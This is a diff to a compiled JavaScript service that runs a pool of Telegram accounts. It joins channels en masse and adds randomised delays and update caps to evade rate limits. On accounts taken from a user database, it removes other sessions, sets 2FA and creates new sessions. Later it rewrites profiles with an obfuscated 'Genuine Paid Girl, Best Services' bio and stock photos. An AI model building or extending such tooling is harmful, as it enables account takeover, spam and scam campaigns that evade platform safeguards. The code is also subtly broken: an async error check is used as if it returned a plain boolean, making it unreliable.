@@ -55,13 +55,13 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         this.isJoinChannelProcessing = false;
         this.isLeaveChannelProcessing = false;
         this.activeTimeouts = new Set();
-        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
-        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
+        this.JOIN_CHANNEL_INTERVAL = 6 * 60 * 1000;
+        this.LEAVE_CHANNEL_INTERVAL = 120 * 1000;
         this.LEAVE_CHANNEL_BATCH_SIZE = 10;
-        this.CLIENT_PROCESSING_DELAY = 5000;
-        this.CHANNEL_PROCESSING_DELAY = 10000;
+        this.CLIENT_PROCESSING_DELAY = 10000;
+        this.CHANNEL_PROCESSING_DELAY = 20000;
         this.MAX_MAP_SIZE = 100;
-        this.CLEANUP_INTERVAL = 10 * 60 * 1000;
+        this.CLEANUP_INTERVAL = 15 * 60 * 1000;
         this.MAX_NEEDED = 160;
         this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER = 10;
         this.MAX_NEEDED_BUFFER_CLIENTS_PER_CLIENT = 10;
@@ -277,24 +277,23 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
             const mobile = client.mobile;
             try {
                 this.logger.debug(`Updating info for client ${i + 1}/${clients.length}: ${mobile}`);
-                await (0, Helpers_1.sleep)(2000);
                 const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
                     autoDisconnect: false,
                     handler: false,
                 });
-                await (0, Helpers_1.sleep)(1500);
                 const channels = await (0, channelinfo_1.channelInfo)(telegramClient.client, true);
                 this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
-                await (0, Helpers_1.sleep)(1000);
                 await this.update(mobile, { channels: channels.ids.length });
             }
             catch (error) {
                 const errorDetails = (0, parseError_1.parseError)(error);
-                try {
-                    await this.markAsInactive(mobile, `${errorDetails.message}`);
-                }
-                catch (markError) {
-                    this.logger.error(`Error marking client ${mobile} as inactive:`, markError);
+                if (this.isPermanentError(errorDetails)) {
+                    try {
+                        await this.markAsInactive(mobile, `${errorDetails.message}`);
+                    }
+                    catch (markError) {
+                        this.logger.error(`Error marking client ${mobile} as inactive:`, markError);
+                    }
                 }
                 this.logger.error(`Error updating info for client ${mobile}:`, errorDetails);
             }
@@ -306,7 +305,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                 }
                 if (i < clients.length - 1) {
-                    await (0, Helpers_1.sleep)(4000);
+                    await (0, Helpers_1.sleep)(8000 + Math.random() * 4000);
                 }
             }
         }
@@ -322,7 +321,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         this.leaveChannelMap.clear();
         this.clearJoinChannelInterval();
         this.clearLeaveChannelInterval();
-        await (0, Helpers_1.sleep)(3000);
+        await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
         const existingKeys = skipExisting
             ? []
             : Array.from(this.joinChannelMap.keys());
@@ -352,7 +351,6 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     autoDisconnect: false,
                     handler: false,
                 });
-                await (0, Helpers_1.sleep)(2000);
                 const channels = await (0, channelinfo_1.channelInfo)(client.client, true);
                 this.logger.debug(`Client ${mobile} has ${channels.ids.length} existing channels`);
                 await this.update(mobile, { channels: channels.ids.length });
@@ -407,7 +405,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     this.logger.error(`Session invalid for ${mobile} due to ${errorMsg}, removing client`);
                     try {
                         await this.remove(mobile, `JoinChannelError: ${errorDetails.message}`);
-                        await (0, Helpers_1.sleep)(2000);
+                        await (0, Helpers_1.sleep)(4000 + Math.random() * 2000);
                     }
                     catch (removeErr) {
                         this.logger.error(`Failed to remove client ${mobile}:`, removeErr);
@@ -425,19 +423,19 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                 }
                 if (i < clients.length - 1) {
-                    await (0, Helpers_1.sleep)(this.CLIENT_PROCESSING_DELAY);
+                    await (0, Helpers_1.sleep)(this.CLIENT_PROCESSING_DELAY + Math.random() * 5000);
                 }
             }
         }
-        await (0, Helpers_1.sleep)(3000);
+        await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
         if (joinSet.size > 0) {
             this.startMemoryCleanup();
             this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);
-            this.createTimeout(() => this.joinChannelQueue(), 2000);
+            this.createTimeout(() => this.joinChannelQueue(), 4000 + Math.random() * 2000);
         }
         if (leaveSet.size > 0) {
             this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);
-            this.createTimeout(() => this.leaveChannelQueue(), 5000);
+            this.createTimeout(() => this.leaveChannelQueue(), 10000 + Math.random() * 5000);
         }
         this.logger.log(`Join process complete — Success: ${successCount}, Fail: ${failCount}`);
         return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;
@@ -523,7 +521,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                     this.removeFromBufferMap(mobile);
                     try {
-                        await (0, Helpers_1.sleep)(2000);
+                        await (0, Helpers_1.sleep)(4000 + Math.random() * 2000);
                         const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                         await this.update(mobile, { channels: channelsInfo.ids.length });
                     }
@@ -543,7 +541,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     this.removeFromBufferMap(mobile);
                     try {
                         await this.remove(mobile, `Process JoinChannelError: ${errorDetails.message}`);
-                        await (0, Helpers_1.sleep)(2000);
+                        await (0, Helpers_1.sleep)(4000 + Math.random() * 2000);
                     }
                     catch (removeError) {
                         this.logger.error(`Error removing client ${mobile}:`, removeError);
@@ -557,9 +555,8 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                 catch (unregisterError) {
                     this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                 }
-                if (i < keys.length - 1 ||
-                    this.joinChannelMap.get(mobile)?.length > 0) {
-                    await (0, Helpers_1.sleep)(this.CHANNEL_PROCESSING_DELAY);
+                if (i < keys.length - 1 || this.joinChannelMap.get(mobile)?.length > 0) {
+                    await (0, Helpers_1.sleep)(this.CHANNEL_PROCESSING_DELAY + Math.random() * 10000);
                 }
                 else {
                     this.logger.log(`Not Sleeping before continuing with next Mobile`);
@@ -676,7 +673,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     this.logger.error(`Session invalid for ${mobile}, removing client`);
                     try {
                         await this.remove(mobile, `Process LeaveChannel: ${errorDetails.message}`);
-                        await (0, Helpers_1.sleep)(2000);
+                        await (0, Helpers_1.sleep)(4000 + Math.random() * 2000);
                     }
                     catch (removeError) {
                         this.logger.error(`Error removing client ${mobile}:`, removeError);
@@ -692,11 +689,11 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     await connection_manager_1.connectionManager.unregisterClient(mobile);
                 }
                 catch (unregisterError) {
-                    this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
+                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                 }
                 if (i < keys.length - 1 ||
                     this.leaveChannelMap.get(mobile)?.length > 0) {
-                    await (0, Helpers_1.sleep)(this.LEAVE_CHANNEL_INTERVAL / 2);
+                    await (0, Helpers_1.sleep)((this.LEAVE_CHANNEL_INTERVAL / 2) + Math.random() * 60000);
                 }
             }
         }
@@ -711,9 +708,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         this.isLeaveChannelProcessing = false;
         this.logger.debug('Leave channel interval cleared and processing flag reset');
     }
-    async setAsBufferClient(mobile, clientId, availableDate = new Date(Date.now() - 24 * 60 * 60 * 1000)
-        .toISOString()
-        .split('T')[0]) {
+    async setAsBufferClient(mobile, clientId, availableDate = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().split('T')[0]) {
         const user = (await this.usersService.search({ mobile, expired: false }))[0];
         if (!user) {
             throw new common_1.BadRequestException('user not found');
@@ -724,16 +719,14 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         }
         const clients = await this.clientService.findAll();
         const clientMobiles = clients.map((client) => client?.mobile);
-        const existingAssignment = await this.bufferClientModel.findOne({
-            mobile,
-            clientId: { $exists: true },
-        });
+        const existingAssignment = await this.bufferClientModel.findOne({ mobile, clientId: { $exists: true } });
         if (!clientMobiles.includes(mobile) && !existingAssignment) {
             const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
-                autoDisconnect: false,
+                autoDisconnect: false
             });
             try {
                 await telegramClient.set2fa();
+                await (0, Helpers_1.sleep)(30000 + Math.random() * 15000);
                 const channels = await this.telegramService.getChannelInfo(mobile, true);
                 const newSession = await this.telegramService.createNewSession(user.mobile);
                 const bufferClient = {
@@ -839,64 +832,149 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         }
         let cli;
         try {
+            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
             cli = await connection_manager_1.connectionManager.getClient(doc.mobile, {
                 autoDisconnect: true,
                 handler: false,
             });
+            const lastUsed = doc.lastUsed ? new Date(doc.lastUsed).getTime() : 0;
+            const now = Date.now();
+            if (lastUsed && now - lastUsed < 30 * 60 * 1000) {
+                this.logger.warn(`Client ${doc.mobile} was recently used, skipping to avoid rate limits`);
+                return;
+            }
             const me = await cli.getMe();
-            if (doc.createdAt && doc.createdAt < new Date(Date.now() - 1 * 24 * 60 * 60 * 1000)) {
-                await cli.updatePrivacyforDeletedAccount();
-            }
-            if (doc.createdAt && doc.createdAt < new Date(Date.now() - 2 * 24 * 60 * 60 * 1000) && doc.createdAt > new Date(Date.now() - 5 * 24 * 60 * 60 * 1000)) {
-                const photos = await cli.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
-                    userId: 'me',
-                    offset: 0,
-                }));
-                if (photos.photos.length > 0) {
-                    await cli.deleteProfilePhotos();
+            await (0, Helpers_1.sleep)(5000 + Math.random() * 10000);
+            let updateCount = 0;
+            const MAX_UPDATES_PER_RUN = 2;
+            if (doc.createdAt && doc.createdAt < new Date(Date.now() - 1 * 24 * 60 * 60 * 1000) && updateCount < MAX_UPDATES_PER_RUN) {
+                try {
+                    await cli.updatePrivacyforDeletedAccount();
+                    updateCount++;
+                    this.logger.debug(`Updated privacy settings for ${doc.mobile}`);
+                    await (0, Helpers_1.sleep)(20000 + Math.random() * 15000);
+                }
+                catch (error) {
+                    this.logger.warn(`Failed to update privacy for ${doc.mobile}: ${error.message}`);
+                    if (this.isPermanentError(error)) {
+                        await this.markAsInactive(doc.mobile, `Rate limit hit during privacy update: ${error.message}`);
+                        return;
+                    }
                 }
             }
-            if (doc.createdAt && doc.createdAt < new Date(Date.now() - 3 * 24 * 60 * 60 * 1000) && doc.channels > 100) {
+            if (doc.createdAt &&
+                doc.createdAt < new Date(Date.now() - 2 * 24 * 60 * 60 * 1000) &&
+                doc.createdAt > new Date(Date.now() - 5 * 24 * 60 * 60 * 1000) &&
+                updateCount < MAX_UPDATES_PER_RUN) {
+                try {
+                    const photos = await cli.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
+                        userId: 'me',
+                        offset: 0,
+                    }));
+                    if (photos.photos.length > 0) {
+                        await cli.deleteProfilePhotos();
+                        updateCount++;
+                        this.logger.debug(`Deleted profile photos for ${doc.mobile}`);
+                        await (0, Helpers_1.sleep)(20000 + Math.random() * 15000);
+                    }
+                }
+                catch (error) {
+                    this.logger.warn(`Failed to delete photos for ${doc.mobile}: ${error.message}`);
+                    if (this.isPermanentError(error)) {
+                        await this.markAsInactive(doc.mobile, `Rate limit hit during photo deletion: ${error.message}`);
+                        return;
+                    }
+                }
+            }
+            if (doc.createdAt &&
+                doc.createdAt < new Date(Date.now() - 3 * 24 * 60 * 60 * 1000) &&
+                doc.channels > 100 &&
+                updateCount < MAX_UPDATES_PER_RUN) {
                 if (me.firstName !== client.name) {
-                    this.logger.log(`Updating first name for ${doc.mobile} from ${me.firstName} to ${client.name}`);
-                    cli.updateProfile(client.name, (0, utils_1.obfuscateText)(`Genuine Paid Girl${(0, utils_1.getRandomEmoji)()}, Best Services${(0, utils_1.getRandomEmoji)()}`, { maintainFormatting: false, preserveCase: true }));
+                    try {
+                        this.logger.log(`Updating first name for ${doc.mobile} from ${me.firstName} to ${client.name}`);
+                        await cli.updateProfile(client.name, (0, utils_1.obfuscateText)(`Genuine Paid Girl${(0, utils_1.getRandomEmoji)()}, Best Services${(0, utils_1.getRandomEmoji)()}`, {
+                            maintainFormatting: false,
+                            preserveCase: true,
+                        }));
+                        updateCount++;
+                        this.logger.debug(`Updated name and bio for ${doc.mobile}`);
+                        await (0, Helpers_1.sleep)(20000 + Math.random() * 15000);
+                    }
+                    catch (error) {
+                        this.logger.warn(`Failed to update profile for ${doc.mobile}: ${error.message}`);
+                        if (this.isPermanentError(error)) {
+                            await this.markAsInactive(doc.mobile, `Rate limit hit during profile update: ${error.message}`);
+                            return;
+                        }
+                    }
                 }
             }
-            if (doc.createdAt && doc.createdAt < new Date(Date.now() - 7 * 24 * 60 * 60 * 1000) && doc.channels > 150) {
-                await this.telegramService.updateUsernameForAClient(doc.mobile, client.clientId, client.name, me.username);
+            if (doc.createdAt &&
+                doc.createdAt < new Date(Date.now() - 7 * 24 * 60 * 60 * 1000) &&
+                doc.channels > 150 &&
+                updateCount < MAX_UPDATES_PER_RUN) {
+                try {
+                    await this.telegramService.updateUsernameForAClient(doc.mobile, client.clientId, client.name, me.username);
+                    updateCount++;
+                    this.logger.debug(`Updated username for ${doc.mobile}`);
+                    await (0, Helpers_1.sleep)(20000 + Math.random() * 15000);
+                }
+                catch (error) {
+                    this.logger.warn(`Failed to update username for ${doc.mobile}: ${error.message}`);
+                    if (this.isPermanentError(error)) {
+                        await this.markAsInactive(doc.mobile, `Rate limit hit during username update: ${error.message}`);
+                        return;
+                    }
+                }
             }
-            if (doc.createdAt && doc.createdAt < new Date(Date.now() - 10 * 24 * 60 * 60 * 1000)) {
-                const rootPath = process.cwd();
-                const photos = await cli.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
-                    userId: 'me',
-                    offset: 0,
-                }));
-                if (photos.photos.length < 1) {
-                    await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
-                    await (0, Helpers_1.sleep)(2000);
-                    await cli.updateProfilePic(path_1.default.join(rootPath, 'dp1.jpg'));
-                    await cli.updateProfilePic(path_1.default.join(rootPath, 'dp2.jpg'));
-                    await cli.updateProfilePic(path_1.default.join(rootPath, 'dp3.jpg'));
+            if (doc.createdAt &&
+                doc.createdAt < new Date(Date.now() - 10 * 24 * 60 * 60 * 1000) &&
+                doc.channels > 170 &&
+                updateCount < MAX_UPDATES_PER_RUN) {
+                try {
+                    const rootPath = process.cwd();
+                    const photos = await cli.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
+                        userId: 'me',
+                        offset: 0,
+                    }));
+                    if (photos.photos.length < 1) {
+                        await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
+                        await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
+                        const photoPaths = ['dp1.jpg', 'dp2.jpg', 'dp3.jpg'];
+                        for (const photo of photoPaths) {
+                            if (updateCount >= MAX_UPDATES_PER_RUN)
+                                break;
+                            await cli.updateProfilePic(path_1.default.join(rootPath, photo));
+                            updateCount++;
+                            this.logger.debug(`Updated profile photo ${photo} for ${doc.mobile}`);
+                            await (0, Helpers_1.sleep)(20000 + Math.random() * 15000);
+                        }
+                    }
+                }
+                catch (error) {
+                    this.logger.warn(`Failed to update profile photos for ${doc.mobile}: ${error.message}`);
+                    if (this.isPermanentError(error)) {
+                        await this.markAsInactive(doc.mobile, `Rate limit hit during photo update: ${error.message}`);
+                        return;
+                    }
                 }
             }
         }
         catch (error) {
             this.logger.error(`Error with client ${doc.mobile}: ${error.message}`);
             const errorDetails = (0, parseError_1.parseError)(error);
-            if ((0, utils_1.contains)(errorDetails.message, [
-                'SESSION_REVOKED',
-                'AUTH_KEY_UNREGISTERED',
-                'USER_DEACTIVATED',
-                'USER_DEACTIVATED_BAN',
-                'FROZEN_METHOD_INVALID',
-            ])) {
+            if (this.isPermanentError(errorDetails)) {
                 try {
                     await this.remove(doc.mobile, `Process BufferClient Error: ${error.message}`);
-                    await (0, Helpers_1.sleep)(1500);
+                    await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
                 }
                 catch (removeError) {
                     this.logger.error(`Error removing client ${doc.mobile}:`, removeError);
                 }
+            }
+            else if (error.message.includes('FLOOD_WAIT') || error.message.includes('TOO_MANY_REQUESTS')) {
+                await this.markAsInactive(doc.mobile, `Rate limit hit: ${error.message}`);
             }
         }
         finally {
@@ -907,7 +985,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
             catch (unregisterError) {
                 this.logger.error(`Error unregistering client ${doc.mobile}: ${unregisterError.message}`);
             }
-            await (0, Helpers_1.sleep)(3000);
+            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
         }
     }
     async addNewUserstoBufferClients(badIds, goodIds, clientsNeedingBufferClients = [], bufferClientsPerClient) {
@@ -990,10 +1068,10 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                     if (!hasPassword) {
                         await client.removeOtherAuths();
-                        await (0, Helpers_1.sleep)(10000);
+                        await (0, Helpers_1.sleep)(10000 + Math.random() * 10000);
                         await client.set2fa();
                         this.logger.debug('Waiting for setting 2FA');
-                        await (0, Helpers_1.sleep)(30000);
+                        await (0, Helpers_1.sleep)(20000 + Math.random() * 20000);
                         const channels = await this.telegramService.getChannelInfo(document.mobile, true);
                         const newSession = await this.telegramService.createNewSession(document.mobile);
                         this.logger.debug(`Inserting Document for client ${targetClientId}`);
@@ -1002,9 +1080,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                             session: newSession,
                             mobile: document.mobile,
                             lastUsed: null,
-                            availableDate: new Date(Date.now() - 24 * 60 * 60 * 1000)
-                                .toISOString()
-                                .split('T')[0],
+                            availableDate: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().split('T')[0],
                             channels: channels.ids.length,
                             clientId: targetClientId,
                             status: 'active',
@@ -1087,9 +1163,9 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                     const hasPassword = await client.hasPassword();
                     if (!hasPassword) {
                         await client.removeOtherAuths();
-                        await (0, Helpers_1.sleep)(10000);
+                        await (0, Helpers_1.sleep)(20000 + Math.random() * 10000);
                         await client.set2fa();
-                        await (0, Helpers_1.sleep)(30000);
+                        await (0, Helpers_1.sleep)(60000 + Math.random() * 30000);
                     }
                     const newSession = await this.telegramService.createNewSession(bufferClient.mobile);
                     await this.update(bufferClient.mobile, {
@@ -1108,7 +1184,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                 }
                 finally {
                     await connection_manager_1.connectionManager.unregisterClient(bufferClient.mobile);
-                    await (0, Helpers_1.sleep)(5000);
+                    await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                 }
             }
             catch (error) {
@@ -1300,6 +1376,15 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
             updateData.message = message;
         }
         return this.update(mobile, updateData);
+    }
+    async isPermanentError(errorDetails) {
+        return (0, utils_1.contains)(errorDetails.message, [
+            'SESSION_REVOKED',
+            'AUTH_KEY_UNREGISTERED',
+            'USER_DEACTIVATED',
+            'USER_DEACTIVATED_BAN',
+            'FROZEN_METHOD_INVALID',
+        ]);
     }
 };
 exports.BufferClientService = BufferClientService;
